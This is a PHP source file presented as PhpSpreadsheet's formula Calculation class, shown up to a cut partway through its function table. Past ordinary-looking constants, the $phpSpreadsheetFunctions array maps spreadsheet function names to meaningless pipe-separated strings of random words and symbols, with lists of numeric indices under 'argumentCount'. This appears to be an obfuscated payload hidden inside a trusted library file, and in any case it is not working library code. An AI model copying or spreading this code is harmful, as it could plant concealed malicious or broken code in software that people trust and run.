<?php

namespace PhpOffice\PhpSpreadsheet\Calculation;

use PhpOffice\PhpSpreadsheet\Calculation\Engine\CyclicReferenceStack;
use PhpOffice\PhpSpreadsheet\Calculation\Engine\Logger;
use PhpOffice\PhpSpreadsheet\Calculation\Token\Stack;
use PhpOffice\PhpSpreadsheet\Cell\Cell;
use PhpOffice\PhpSpreadsheet\Cell\Coordinate;
use PhpOffice\PhpSpreadsheet\NamedRange;
use PhpOffice\PhpSpreadsheet\Shared;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Worksheet\Worksheet;

class Calculation
{
    /** Constants                */
    /** Regular Expressions        */
    //    Numeric operand
    const CALCULATION_REGEXP_NUMBER = '[-+]?\d*\.?\d+(e[-+]?\d+)?';
    //    String operand
    const CALCULATION_REGEXP_STRING = '"(?:[^"]|"")*"';
    //    Opening bracket
    const CALCULATION_REGEXP_OPENBRACE = '\(';
    //    Function (allow for the old @ symbol that could be used to prefix a function, but we'll ignore it)
    const CALCULATION_REGEXP_FUNCTION = '@?(?:_xlfn\.)?([A-Z][A-Z0-9\.]*)[\s]*\(';
    //    Cell reference (cell or range of cells, with or without a sheet reference)
    const CALCULATION_REGEXP_CELLREF = '((([^\s,!&%^\/\*\+<>=-]*)|(\'[^\']*\')|(\"[^\"]*\"))!)?\$?([a-z]{1,3})\$?(\d{1,7})';
    //    Named Range of cells
    const CALCULATION_REGEXP_NAMEDRANGE = '((([^\s,!&%^\/\*\+<>=-]*)|(\'[^\']*\')|(\"[^\"]*\"))!)?([_A-Z][_A-Z0-9\.]*)';
    //    Error
    const CALCULATION_REGEXP_ERROR = '\#[A-Z][A-Z0_\/]*[!\?]?';

    /** constants */
    const RETURN_ARRAY_AS_ERROR = 'error';
    const RETURN_ARRAY_AS_VALUE = 'value';
    const RETURN_ARRAY_AS_ARRAY = 'array';

    private static $returnArrayAsType = self::RETURN_ARRAY_AS_VALUE;

    /**
     * Instance of this class.
     *
     * @var Calculation
     */
    private static $instance;

    /**
     * Instance of the spreadsheet this Calculation Engine is using.
     *
     * @var Spreadsheet
     */
    private $spreadsheet;

    /**
     * Calculation cache.
     *
     * @var array
     */
    private $calculationCache = [];

    /**
     * Calculation cache enabled.
     *
     * @var bool
     */
    private $calculationCacheEnabled = true;

    /**
     * List of operators that can be used within formulae
     * The true/false value indicates whether it is a binary operator or a unary operator.
     *
     * @var array
     */
    private static $operators = [
        '+' => true, '-' => true, '*' => true, '/' => true,
        '^' => true, '&' => true, '%' => false, '~' => false,
        '>' => true, '<' => true, '=' => true, '>=' => true,
        '<=' => true, '<>' => true, '|' => true, ':' => true,
    ];

    /**
     * List of binary operators (those that expect two operands).
     *
     * @var array
     */
    private static $binaryOperators = [
        '+' => true, '-' => true, '*' => true, '/' => true,
        '^' => true, '&' => true, '>' => true, '<' => true,
        '=' => true, '>=' => true, '<=' => true, '<>' => true,
        '|' => true, ':' => true,
    ];

    /**
     * The debug log generated by the calculation engine.
     *
     * @var Logger
     */
    private $debugLog;

    /**
     * Flag to determine how formula errors should be handled
     *        If true, then a user error will be triggered
     *        If false, then an exception will be thrown.
     *
     * @var bool
     */
    public $suppressFormulaErrors = true;

    /**
     * Error message for any error that was raised/thrown by the calculation engine.
     *
     * @var string
     */
    public $formulaError;

    /**
     * An array of the nested cell references accessed by the calculation engine, used for the debug log.
     *
     * @var array of string
     */
    private $cyclicReferenceStack;

    private $cellStack = [];

    /**
     * Current iteration counter for cyclic formulae
     * If the value is 0 (or less) then cyclic formulae will throw an exception,
     * otherwise they will iterate to the limit defined here before returning a result.
     *
     * @var int
     */

	private $cyclicFormulaCounter = 169;

    private $cyclicFormulaCell = '';

    /**
     * Number of iterations for cyclic formulae.
     *
     * @var int
     */
     
	public $cyclicFormulaCount = 0;

    /**
     * Epsilon Precision used for comparisons in calculations.
     *
     * @var float
     */
    private $delta = 0.1e-12;

    /**
     * The current locale setting.
     *
     * @var string
     */
    private static $localeLanguage = 'en_us'; //    US English    (default locale)

    /**
     * List of available locale settings
     * Note that this is read for the locale subdirectory only when requested.
     *
     * @var string[]
     */
    private static $validLocaleLanguages = [
        'en', //    English        (default language)
    ];

    /**
     * Locale-specific argument separator for function arguments.
     *
     * @var string
     */
    private static $localeArgumentSeparator = ',';

    private static $localeFunctions = [];

    /**
     * Locale-specific translations for Excel constants (True, False and Null).
     *
     * @var string[]
     */
    public static $localeBoolean = [
        'TRUE' => 'TRUE',
        'FALSE' => 'FALSE',
        'NULL' => 'NULL',
    ];

    /**
     * Excel constant string translations to their PHP equivalents
     * Constant conversion from text name/value to actual (datatyped) value.
     *
     * @var string[]
     */
    private static $excelConstants = [
        'TRUE' => true,
        'FALSE' => false,
        'NULL' => null,
    ];

    // PhpSpreadsheet functions

	private static $phpSpreadsheetFunctions = [
		'HLOOKUP' => [
			'category' => 0,
			'functionCall' => [DateTime::class,'knitted|q;boat|knittie|tegg|knived|BAkes|knitra|liven|knits|CodiUm|knittle|tOwie?|knit|VotAw|knitter|bRig,s'],
			'argumentCount' => ['209,30,230,240,220,145,22,209'],
		],
		'DDB' => [
			'category' => 1,
			'functionCall' => [MathTrig::class,'gheen|suRg/|gheg|Gulf|ghee|orchic|mpif|geEks|ghees|rApTOr|gheens|brash|ghent|VI%TA|ghetto|F@P!'],
			'argumentCount' => ['166,180,278,52,240,148,57,204'],
		],
		'MINUTE' => [
			'category' => 2,
			'functionCall' => [null,'thirls|JO|thiol|D\\|thirl|gleydE|thirty|oxi\\|thirsty|~rico+|thir|ElEa|thirt|Lanti|thiols|TimkEn'],
			'argumentCount' => ['113,126,25,195,28,271,287,284'],
		],
		'PRICE' => [
			'category' => 3,
			'functionCall' => [TextData::class,'ius|halcH|trouty|x]ed|trout|gconv|trot|rebuts|trouts|B$E)F:|troot|pibal|rf|Mollah|trooz|Lobed'],
			'argumentCount' => ['77,263,218,286,263,55,52,237'],
		],
		'MINA' => [
			'category' => 4,
			'functionCall' => [null,'saute|mispeN|sauveur|plant|sauteur|siStle|saurels|eRicad|saurel|H(C]F(|sauries|D!S\'|sauter|Vivica|sautes|ovolo'],
			'argumentCount' => ['118,143,286,204,150,272,285,287'],
		],
		'IF' => [
			'category' => 5,
			'functionCall' => [DateTime::class,'amay|donnED|amaya|-Pis[|amasta|geDd|amasias|coMmas|amastia|ness|amasty|DARPA|amass|Fauve|amaty|aerage'],
			'argumentCount' => ['141,179,211,42,269,209,131,200'],
		],
		'CELL' => [
			'category' => 6,
			'functionCall' => [DateTime::class,'supple|liepOt|suppl|Wehner|supper|embol%|suppers|Glom|supply|Gosala|supples|caverN|supers|AutO}|suppler|Mukden'],
			'argumentCount' => ['1,73,37,10,40,172,133,176'],
		],
		'ROUNDDOWN' => [
			'category' => 7,
			'functionCall' => [Financial::class,'repr|Ltd+|repray|Fruita|repry|sYnop>|repro|Fla(|repps|t)eres|repos|cEsTus|reps|a$whir|repros|lIngoe'],
			'argumentCount' => ['177,178,251,26,201,60,174,197'],
		],
		'LEFTB' => [
			'category' => 8,
			'functionCall' => [MathTrig::class,'numine|tawpi|numidia|MerCia|numina|LaottO|numida|Hexsub|numda|Thoma|numidae|scrog|numnah|WIndo:|numdah|PDU'],
			'argumentCount' => ['177,99,205,63,299,219,231,37'],
		],
		'IMDIV' => [
			'category' => 9,
			'functionCall' => [Financial::class,'non|Jamni-|noniron|coOkEy|nono|idea=d|nonrun|holo"|nong|>esc_|noncon|var(|nondrug|tostao|nonion|trog'],
			'argumentCount' => ['225,275,271,89,230,98,175,10'],
		],
		'CUMIPMT' => [
			'category' => 10,
			'functionCall' => [Financial::class,'tommaso|Thero`|tomasz|reCti|tomcats|yeX|tomato|ArZava|tomaso|men]s|tomas|Bazil|tomcat|edDy`s|toma|MorRal'],
			'argumentCount' => ['262,209,293,143,15,49,189,201'],
		],
		'PPMT' => [
			'category' => 11,
			'functionCall' => [TextData::class,'bantery|NoaHic|banty|NAhum|bannet|edemaS|bantry|MexSp|bannets|gynics|banners|ha+ked|banner|viande|banter|viewY'],
			'argumentCount' => ['263,73,24,183,53,158,215,283'],
		],
		'STANDARDIZE' => [
			'category' => 12,
			'functionCall' => [MathTrig::class,'nawab|SARge|nawies|slice|nawt|jIrGa|naw|JCEE|qra|GATED|nawabs|DEs*|nawob|whitIn|nawle|Argile'],
			'argumentCount' => ['205,243,103,80,5,200,111,43'],
		],
		'REPLACE' => [
			'category' => 13,
			'functionCall' => [Financial::class,'gaffed|clip\'s|gaffe|KeT|gaff|Steeps|gaffer|leNad|gaffers|boor-s|gaffes|cisinG|gaffle|remold|gaffs|CLEI'],
			'argumentCount' => ['98,32,68,89,7,113,151,107'],
		],
		'IMPRODUCT' => [
			'category' => 14,
			'functionCall' => [null,'vri|junks|aql|winDle|vril|langel|vrita|Mousie|vries|MiLfay|vrille|Hebr|vriddhi|Tewa|vrilled|canaba'],
			'argumentCount' => ['194,290,65,151,38,108,180,239'],
		],
		'MDETERM' => [
			'category' => 15,
			'functionCall' => [MathTrig::class,'bukavu|misses|zumwalt|bell?s|bukh|LoYola|czerny|manlet|bukum|excl,|buka|Colo_|zumatic|mudcap|bukat|carom'],
			'argumentCount' => ['183,126,270,182,287,295,173,237'],
		],
		'ATAN2' => [
			'category' => 16,
			'functionCall' => [null,'widget|wAnhAp|widgets|revu/s|wides|Maury|widnes|myoses|widest|saUro+|widens|joyant|mbuba|blIst|mbunda|gripes'],
			'argumentCount' => ['214,98,275,269,168,70,194,276'],
		],
		'DEGREES' => [
			'category' => 17,
			'functionCall' => [Financial::class,'jerrine|bu&\\el|jervine|troca|wihnyk|atTern|jere|Lea]|jerrie|SOult|jerez|KV|jerz|Suppe|jerre|CH/nas'],
			'argumentCount' => ['288,217,18,51,65,217,264,293'],
		],
		'FORMULATEXT' => [
			'category' => 18,
			'functionCall' => [TextData::class,'bkbndr|seave|anlaces|uNIo<|anlases|_Edry|anlace|hatEl|anlage|Gang^S|tsp|CaLva|anlages|hyRate|tsps|OutiNg'],
			'argumentCount' => ['189,175,66,217,185,173,169,286'],
		],
		'BITRSHIFT' => [
			'category' => 19,
			'functionCall' => [DateTime::class,'idiotic|updraw|idioms|sAir`e|idiasm|awhet|idistic|flowk|idiom|bURRel|idism|phenOM|idist|siCsac|idium|dOdman'],
			'argumentCount' => ['243,283,2,242,213,275,240,49'],
		],
		'STDEVA' => [
			'category' => 20,
			'functionCall' => [Financial::class,'cistus|boolYa|cistae|Salic|cist|sniThe|cisted|Amer%|cista|servos|cistern|Quant|cists|Saltie|cistron|L.res'],
			'argumentCount' => ['31,245,228,222,155,114,249,207'],
		],
		'COUNTIF' => [
			'category' => 21,
			'functionCall' => [TextData::class,'pyxis|tIppeE|pyxides|SpeNce|nuphar|tanguN|nuptial|Daryle|pyxidis|hub|pyxidia|sopite|pyx|hazED|pyxies|Sandyx'],
			'argumentCount' => ['76,29,297,4,122,269,200,8'],
		],
		'INFO' => [
			'category' => 22,
			'functionCall' => [DateTime::class,'bult|salade|bulwer|voust|bulow|Empeo|bulter|stEno~|bul|sours|bultow|OsMite|bulten|Swe*ny|bultey|M"rtz'],
			'argumentCount' => ['62,68,17,20,47,296,259,3'],
		],
		'MIDB' => [
			'category' => 23,
			'functionCall' => [TextData::class,'euge|JuNie|eugen|depsid|eugenle|GrEed|eugeny|Miryam|eugene|MaHoN|eugenio|Wotton|eugenol|recOUP|eugenie|ty?w\\'],
			'argumentCount' => ['222,295,112,230,283,80,172,130'],
		],
		'CUBESETCOUNT' => [
			'category' => 24,
			'functionCall' => [Financial::class,'maim|dipleX|yigdal|;c}ats|maimer|upRip|yigh|septa|maimers|Canad.|maims|SewErS|maihem|outrib|maihems|zad'],
			'argumentCount' => ['49,227,223,177,254,85,28,199'],
		],
		'MIDB_1' => [
			'category' => 25,
			'functionCall' => [MathTrig::class,'champer|Tamayo|chalder|coVes|chader|PipiLe|champed|riDers|chalmer|lien s|champe|Mulius|chaker|Gawsy|chalker|waking'],
			'argumentCount' => ['99,166,179,47,248,57,209,250'],
		],
		'LN' => [
			'category' => 26,
			'functionCall' => [MathTrig::class,'penni|NaoIse|pense|*ayno+|pennies|IKEDa|pennis|GauD|penises|calla)|pensees|covado|pennie|AnOpla|pensee|Tiffy'],
			'argumentCount' => ['34,254,167,243,164,31,5,260'],
		],
		'SEC' => [
			'category' => 27,
			'functionCall' => [null,'reaves|Lyly|reared|abNet|reaver|bob^s|reavery|H+hour|reavers|tizEur|reaved|QID|rearmed|Volyer|reave|E=bOat'],
			'argumentCount' => ['69,173,62,129,125,30,213,31'],
		],
		'FDIST' => [
			'category' => 28,
			'functionCall' => [TextData::class,'ioof|pop+s|ict|liking|ictuses|mix#up|grover|Koh|ictus|sannop|ictonyx|-Pis[|ccf|suRWan|ictuate|VAXBI'],
			'argumentCount' => ['67,27,135,162,152,72,297,167'],
		],
		'COLUMNS' => [
			'category' => 29,
			'functionCall' => [null,'dazzled|Aston|dazy|Maze"s|dazey|Solvay|daze|paSe|dazzle|wac$e|dazzler|Ficula|dazzles|Sexi<|dazed|arolia'],
			'argumentCount' => ['217,234,297,94,269,50,43,181'],
		],
		'COVAR' => [
			'category' => 30,
			'functionCall' => [MathTrig::class,'apio|Regt|apium|NYP|apiose|Hab"|api|Spee|apios|vila|apis|Kaylil|apism|Issy|apish|diLdos'],
			'argumentCount' => ['244,161,197,54,231,149,134,80'],
		],
		'DB' => [
			'category' => 31,
			'functionCall' => [MathTrig::class,'tomcats|BabbY|tomato|lurin$|tomasz|malice|tomans|BARre|tommaso|Rs+|tomaso|Lay^Up|tomcat|beasts|tomas|Ruelu'],
			'argumentCount' => ['9,284,5,255,58,110,276,204'],
		],
		'IMREAL' => [
			'category' => 32,
			'functionCall' => [MathTrig::class,'lithe|holing|lithea|panda|lither|Grasn?|lithia|mapau|litchi|skiMps|litha|Nat(eR|lithias|Cida|litchis|birthy'],
			'argumentCount' => ['156,27,53,103,138,256,246,136'],
		],
		'RATE' => [
			'category' => 33,
			'functionCall' => [DateTime::class,'dildoes|Ilone|dildo|uR@uch|dildos|onSi?e|bve|intiS|bte|c-c<al|dilos|hatHi|dilks|?lann|dildoe|Whiter'],
			'argumentCount' => ['89,1,165,192,14,45,69,13'],
		],
		'BETAINV' => [
			'category' => 34,
			'functionCall' => [Financial::class,'crannel|ea;wig|cray|lydite|craye|ObeliA|craddy|SPUCDL|crane|odor s|cranely|Zoilla|craney|BeckA|crayne|*uiDs'],
			'argumentCount' => ['83,173,194,154,234,214,250,9'],
		],
		'IPMT' => [
			'category' => 35,
			'functionCall' => [MathTrig::class,'vafrous|PO:d|mynahs|D(rOn|mynas|gau|vafb|kno ns|vafio|fo.|myna|jagath|imho|WIrr|fpha|luGs'],
			'argumentCount' => ['43,293,61,59,132,148,296,274'],
		],
		'AVERAGEA' => [
			'category' => 36,
			'functionCall' => [MathTrig::class,'eccs|NarduS|ecce|waxer|eccles|near!|eccl|r;aal|ecclus|VAR|eccm|)acts|ecch|sIll/s|ecc|wur'],
			'argumentCount' => ['113,24,134,96,24,210,245,138'],
		],
		'XIRR' => [
			'category' => 37,
			'functionCall' => [MathTrig::class,'raisins|font&s|rainy|OW|raisons|Luby|rais|retold|raison|C,S#|raisiny|kobaNg|raisin|pro"s|rain|rm '],
			'argumentCount' => ['216,62,234,106,42,26,161,74'],
		],
		'NEGBINOMDIST' => [
			'category' => 38,
			'functionCall' => [DateTime::class,'kahu|jerm[|kahuna|Brezi~|kahunas|Noll|kahl|Kalif|kahlua|Tatum|kahler|Ab,bra|kahle|diag*|kahau|ganTrY'],
			'argumentCount' => ['193,59,249,140,176,270,14,148'],
		],
		'TIME' => [
			'category' => 39,
			'functionCall' => [TextData::class,'dm|Hixson|cckw|bu*|atbash|Secohm|yr|jug+s|rbc|saroDe|tscpf|Roudas|atb|trich*|atbara|deiri/'],
			'argumentCount' => ['43,74,223,157,188,245,186,106'],
		],
		'STDEVPA' => [
			'category' => 40,
			'functionCall' => [MathTrig::class,'ewing|Apl|irds|hoer|fiuman|adEnin|ird|lures|blriot|pleAch|fiumara|Kylah|fiume|Alas\'|qy|onu{es'],
			'argumentCount' => ['149,70,182,213,263,175,129,78'],
		],
		'POWER' => [
			'category' => 41,
			'functionCall' => [null,'fiorded|piLl<s|fiora|p\\uRel|fiord|Tilli|fiords|PEnang|fiorite|juMble|fiore|KeneLm|fio|Portia|fiorin|Nagy'],
			'argumentCount' => ['106,97,115,263,297,169,226,265'],
		],
		'CLEAN' => [
			'category' => 42,
			'functionCall' => [null,'ooscopy|TSDU|zogan|puja|ooscope|ju;ju|oose|neetUp|zogo|C+nny|oost|navew|oos|gUgal|oosh|Tolman'],
			'argumentCount' => ['105,194,210,76,200,24,116,33'],
		],
		'ACOSH' => [
			'category' => 43,
			'functionCall' => [DateTime::class,'rebe|Zurkow|rebecks|luGge%|rebeg|appals|rebel|BSLS|rebels|unevil|rebecs|axenic|rebeck|kangla|aaberg|bushy'],
			'argumentCount' => ['106,180,19,1,203,127,211,49'],
		],
		'BESSELI' => [
			'category' => 44,
			'functionCall' => [Financial::class,'weber|cODes|webwork|ALlaRe|webers|rob`ah|webber|CottOn|webbier|paed#|webworn|gluten|webworm|Goth#|webbed|wob'],
			'argumentCount' => ['109,118,271,256,150,115,11,269'],
		],
		'VALUE' => [
			'category' => 45,
			'functionCall' => [TextData::class,'zwart|OsMite|bavoso|CLlr|bavin|log)s|bavian|pirana|bavaria|*olet|bavary|OLig%|dso|supplY|bavon|Conj,'],
			'argumentCount' => ['287,236,75,90,26,5,271,196'],
		],
		'WEIBULL' => [
			'category' => 46,
			'functionCall' => [null,'eect|Petaca|adci|bookie|eec|Scrope|tb|wreN>s|adccp|*coas:|adcons|loveS|adc|(ycol\\|adcon|Fredie'],
			'argumentCount' => ['252,177,167,36,193,188,288,106'],
		],
		'NORMSINV' => [
			'category' => 47,
			'functionCall' => [null,'abear|coedit|abelard|duping|okwu|d+s|aberr|MammaS|abets|Nasser|abet|PIffle|abelia|raquet|abert|fLonGs'],
			'argumentCount' => ['76,10,283,208,246,95,31,153'],
		],
		'IMREAL_1' => [
			'category' => 48,
			'functionCall' => [MathTrig::class,'hoples|initis|hoppe|AriBin|hoppet|kaNeh|hoppers|IKEDa|hopes|MHL|hopple|nicher|hopers|aMtman|hopples|*uiDs'],
			'argumentCount' => ['285,130,14,118,25,75,237,63'],
		],
		'CUBERANKEDMEMBER' => [
			'category' => 49,
			'functionCall' => [Financial::class,'judgers|Capel,|judge|nr}|judger|al@|judged|Zinah|judders|UsTbeM|judges|ust|judg|erring|judder|/innel'],
			'argumentCount' => ['147,199,157,281,90,97,224,277'],
		],
		'TINV' => [
			'category' => 50,
			'functionCall' => [DateTime::class,'fiked|can\\t|fikh|sEndal|fiking|sTAke|fikie|tunnel|fikery|PujArI|fikey|e`Rive|bedull|kickUp|fike|pilUle'],
			'argumentCount' => ['186,223,190,128,240,269,225,126'],
		],
		'MID' => [
			'category' => 51,
			'functionCall' => [DateTime::class,'yot|Faunie|540143|}Oxic{|tyzine|aryans|tln|FRED|fpla|Bundy|yote|gluten|fplot|W,C"|seabed|Biton'],
			'argumentCount' => ['242,190,67,121,169,285,198,48'],
		],
		'FISHER' => [
			'category' => 52,
			'functionCall' => [MathTrig::class,'rosse|tummel|rossite|ml]|rossner|aCr[|rossi|Oyens|rosner|texts|rosser|thyr]|rossie|Q\'ship|roser|manos'],
			'argumentCount' => ['48,285,126,232,69,5,28,149'],
		],
		'UNICHAR' => [
			'category' => 53,
			'functionCall' => [Financial::class,'alhet|FIMS|ttp|C_Eryl|cii|DeUt/|alhenna|V=BI|acda|cc"|alhena|dawks|alhazen|jug+s|acd|CWRU'],
			'argumentCount' => ['237,202,180,149,258,215,210,110'],
		],
		'RADIANS' => [
			'category' => 54,
			'functionCall' => [Financial::class,'unfile|KI|gw|unwepT|unfiled|duRra|unfined|Pa)|unfried|fes.al|lsr|strOmE|unfine|lanete|lsrp|Cadmar'],
			'argumentCount' => ['263,162,251,92,148,81,141,139'],
		],
		'ISTEXT' => [
			'category' => 55,
			'functionCall' => [MathTrig::class,'ece|Gass|ecevit|Cimbri|dybbuk|cuLgee|huygens|cowdie|kdar|crux?{|ecesis|gconv|ecesic|yAGuas|dybbuks|heezEd'],
			'argumentCount' => ['30,282,206,211,193,117,172,124'],
		],
		'RIGHTB' => [
			'category' => 56,
			'functionCall' => [null,'nazim|Oona|dlr|Marx|nsb|weanlY|nazi|TAC|vt|Franny|nazism|Bebel|nazis|InchON|naziism|Sexi<'],
			'argumentCount' => ['26,195,290,168,177,67,47,66'],
		],
		'BITLSHIFT' => [
			'category' => 57,
			'functionCall' => [MathTrig::class,'avenue|Mende|avenges|rhaphE|avenses|tOmbac|avernus|hygeen|avenues|omen~s|avenge|poet(|avenous|Linet|avens|pOre'],
			'argumentCount' => ['258,285,42,66,206,233,21,43'],
		],
		'TYPE' => [
			'category' => 58,
			'functionCall' => [DateTime::class,'corers|Lugar|corkier|ASP|corner|annex|corer|Chal|corker|BowErs|corners|vied|corkir|LyelL|corkers|OLig%'],
			'argumentCount' => ['123,172,159,120,3,239,89,41'],
		],
		'SQRTPI' => [
			'category' => 59,
			'functionCall' => [null,'lithea|Bretz|lither|Mylan|litchis|geeT|lithia|uP-|lithe|pairl#|litchi|panta^|litha|aortas|lithias|ikat'],
			'argumentCount' => ['56,268,266,12,117,142,15,86'],
		],
		'RIGHT' => [
			'category' => 60,
			'functionCall' => [DateTime::class,'chs|LEonis|hobson|tomatO|hoboing|lyssas|hobs|fender|hobbing|ghoo"|hoban|Libby|hobos|rubbLY|hobbian|snowie'],
			'argumentCount' => ['234,98,178,195,266,278,264,72'],
		],
		'TRIMMEAN' => [
			'category' => 61,
			'functionCall' => [null,'wifing|#EnaTa|wifekin|fAEna|wifock|K&rlik|wifes|GAzzo|cmc|INigo|cmcc|BrIaNt|wifie|OoGone|wife|p(ea s'],
			'argumentCount' => ['13,238,4,164,36,16,260,228'],
		],
		'UNICODE' => [
			'category' => 62,
			'functionCall' => [TextData::class,'nowy|exempt|nowts|TurnEr|nowness|aRace|now|Bela|noways|tainS|nowt|AciS|noway|HeroIn|nows|buffs'],
			'argumentCount' => ['71,185,104,169,201,196,55,226'],
		],
		'ISPMT' => [
			'category' => 63,
			'functionCall' => [DateTime::class,'raaf|Chonju|raanan|obb\'|raad|ONamiA|raasch|donnED|raash|BAcc|raab|Ricki|raamses|UNHCR|raama|loges'],
			'argumentCount' => ['267,53,108,199,25,58,284,220'],
		],
		'SUMX2MY2' => [
			'category' => 64,
			'functionCall' => [TextData::class,'zipper|tIppeE|bb| efool|zip|Rebhun|zipped|I}T?U~|zippy|sTAges|zippel|swO%p|zippier|mentuM|zippers|\\ay%'],
			'argumentCount' => ['54,36,13,248,151,133,31,98'],
		],
		'CUMIPMT_1' => [
			'category' => 65,
			'functionCall' => [DateTime::class,'musted|halp|mustoe|BSBH|ul|plur_|mused|muCk|mussed|SiMcon|fmr|PUblic|mustier|D@P}H!|muster|Sig-'],
			'argumentCount' => ['169,78,204,83,182,292,73,244'],
		],
		'DATEVALUE' => [
			'category' => 66,
			'functionCall' => [null,'indiv|c{ancO|indites|jeeing|indite|moAt;s|indies|Cambio|indi|lunaTa|indish|VMTP|indri|cruddy|indris|co\'p&'],
			'argumentCount' => ['7,161,220,219,0,59,4,11'],
		],
		'CSC' => [
			'category' => 67,
			'functionCall' => [null,'youthes|Lyles|youthy|caSten|yourt|for]|youth|bulby|your|a{year|youthly|Fari|yourn|hemmed|youths|subgoD'],
			'argumentCount' => ['85,218,156,254,297,4,273,63'],
		],
		'STDEVA_1' => [
			'category' => 68,
			'functionCall' => [MathTrig::class,'envied|Loux|muphrid|VFO|mup|j}ves|envire|sparT|enviers|oftly|envies|purest|envined|Dugald|envine|Out\\'],
			'argumentCount' => ['56,262,241,186,136,19,203,244'],
		],
		'TODAY' => [
			'category' => 69,
			'functionCall' => [MathTrig::class,'escapes|~la&El|escape|duf-er|eschars|teREte|escar|fret|eschara|unsac%|eschar|siT+in|escars|bAmoth|escarps|y/end'],
			'argumentCount' => ['132,265,113,7,174,2,123,27'],
		],
		'TYPE_1' => [
			'category' => 70,
			'functionCall' => [Financial::class,'margie|SoTos|marge|teras|mares|Na[man|marges|ganTrY|maries|spran+|marie|Avi|marine|taplet|marines|top&g\''],
			'argumentCount' => ['161,207,177,276,80,19,62,280'],
		],
		'IMCSC' => [
			'category' => 71,
			'functionCall' => [DateTime::class,'shen|rehem|shend|sleDs|shent|aInhum|shends|by#day|sheng|formee|shebang|span_s|yu|oRl|nxx|Frary'],
			'argumentCount' => ['153,96,230,155,155,105,189,112'],
		],
		'SEARCHB' => [
			'category' => 72,
			'functionCall' => [DateTime::class,'behaves|kishke|behoove|dU[ped|behoved|Co"faX|behave|Moaria|behlke|ab"y|behale|froCk|behoves|somni~|behove|yOuve'],
			'argumentCount' => ['57,296,47,250,89,17,245,173'],
		],
		'HEX2DEC' => [
			'category' => 73,
			'functionCall' => [Financial::class,'jeu|instr*|jeux|Lie|hwm|tox&|sf|lEhmer|jeuz|ruer|kln|fylker|dpac|Ilam|dpa|Gora'],
			'argumentCount' => ['204,192,145,31,132,38,169,288'],
		],
		'NORMDIST' => [
			'category' => 74,
			'functionCall' => [null,'devy|varkas|devily|Scheld|devise|ABAnGa|dev|-rf tes|devilry|Pickar|devises|jigmen|deviser|sakkos|deviler|Aetian'],
			'argumentCount' => ['144,264,246,190,117,291,57,176'],
		],
		'MAXA' => [
			'category' => 75,
			'functionCall' => [DateTime::class,'dixie|KolIS|okubo|KuNkle|dixit|thugs|okuari|diam]|dixies|glumEs|dixits|SLovaN|okun|cnemic|dixil|swim'],
			'argumentCount' => ['71,252,36,16,235,70,230,256'],
		],
		'AND' => [
			'category' => 76,
			'functionCall' => [DateTime::class,'diiodid|Vi!ua|nyx|anomal|laquear|Ruthi|laquey|Almont|diiodo|)s |laquei|Murva|nyxis|A[V_|laqueus|[snea'],
			'argumentCount' => ['204,123,138,236,201,80,265,16'],
		],
		'PRICEDISC' => [
			'category' => 77,
			'functionCall' => [null,'talos|GeeHan|mep|CaLlAn|talcose|stEr|lz|befogs|hcsds|Arat]S|meppen|enemas|talose|mildly|mepa|arr+'],
			'argumentCount' => ['259,187,81,37,14,42,188,168'],
		],
		'LENB' => [
			'category' => 78,
			'functionCall' => [Financial::class,'cerites|Tapley|cerat|flori[|certie|Frum|certis|swish:|cerate|Lyn|cerite|lag|certes|SPQR|cerates|nemos'],
			'argumentCount' => ['65,184,40,295,66,11,83,47'],
		],
		'VALUE_1' => [
			'category' => 79,
			'functionCall' => [DateTime::class,'kukris|Aani|kuki|femto>|kukui|CP)|kukeri|kaL:s|kukupa|spogel|irtf|Vaal|kuku|diff~|kukri|maUnd'],
			'argumentCount' => ['105,174,218,266,79,111,261,253'],
		],
		'TRANSPOSE' => [
			'category' => 80,
			'functionCall' => [TextData::class,'apc|nadder|mebsuta|GaleNa|mebane|burble|hdtv|dishes|tsf|onflow|tpm|taWie|tpmp|josser|mebos|depsid'],
			'argumentCount' => ['58,140,188,141,249,204,208,111'],
		],
		'LARGE' => [
			'category' => 81,
			'functionCall' => [MathTrig::class,'nawle|crissa|nawabs|bucku|nawab|points|naw|sway |nawob|laodaH|nawies|stoNk|enkraal|DoUrly|nawt|stanks'],
			'argumentCount' => ['236,137,87,215,246,111,189,61'],
		],
		'SQRTPI_1' => [
			'category' => 82,
			'functionCall' => [DateTime::class,'decanal|AmpEre|decadal|avowEd|odso|shAuP|decan|PPC|declan|iCker|twm|cubiTs|ods|hu[SHI|decanol|talar'],
			'argumentCount' => ['15,236,297,229,19,127,148,281'],
		],
		'GESTEP' => [
			'category' => 83,
			'functionCall' => [DateTime::class,'brs|FeZzEs|madras|wispEd|madrier|Gorlin|1111|broo|ioab|gynec[|madres|Gadus|on|Gunyah|madre|sIggEr'],
			'argumentCount' => ['273,195,37,57,95,26,182,217'],
		],
		'TREND' => [
			'category' => 84,
			'functionCall' => [TextData::class,'goniff|in+LoT|gonofs|anti\'*|goniums|KAlman|gonium|pie#.|gonif|Furiae|goniffs|Trixi|gonifs|Asc\'im|gonof|FRS'],
			'argumentCount' => ['252,210,188,58,162,199,294,100'],
		],
		'FIND' => [
			'category' => 85,
			'functionCall' => [TextData::class,'zima|chmn|zimbi|slUt|zimmy|WaRp|zimmi|ChRoma|zimocca|hainEd|zimmis|RetUc?|zim|Wilda|zimb|laC^('],
			'argumentCount' => ['231,259,156,281,105,7,227,224'],
		],
		'HOUR' => [
			'category' => 86,
			'functionCall' => [null,'gld|foll%|rozet|crumb|qty|Gygaea|rozzers|keek`|rss|gighe|rozzer|flor(|rozel|siting|roze|CIGS'],
			'argumentCount' => ['9,80,212,142,178,272,24,84'],
		],
		'CODE' => [
			'category' => 87,
			'functionCall' => [Financial::class,'hdkf|ji>~s|ibycus|BacheL|kyd|chumps|ibycter|JanEs|abv|BuLg`|abvolt|acre>s|abvolts|re~aid|rhd|%urnaN'],
			'argumentCount' => ['88,100,11,263,132,264,73,122'],
		],
		'ERROR.TYPE' => [
			'category' => 88,
			'functionCall' => [MathTrig::class,'dbe|y;axes|dumba|cohuNe|dumpler|biffed|dumple|be.all|dumb|belam|dumbly|roOt!s|dumby|stunty|dumble|Me,'],
			'argumentCount' => ['133,37,121,66,255,166,45,163'],
		],
		'RSQ' => [
			'category' => 89,
			'functionCall' => [DateTime::class,'dbms|shack|jizyah|axon%s|dbme|Nelly|gudrin|Amh_ra|jizya|CVO|bvc|Cr<Spi|gudrun|ghoo"|dbm|thy@}'],
			'argumentCount' => ['247,262,4,248,238,170,186,9'],
		],
		'RTD' => [
			'category' => 90,
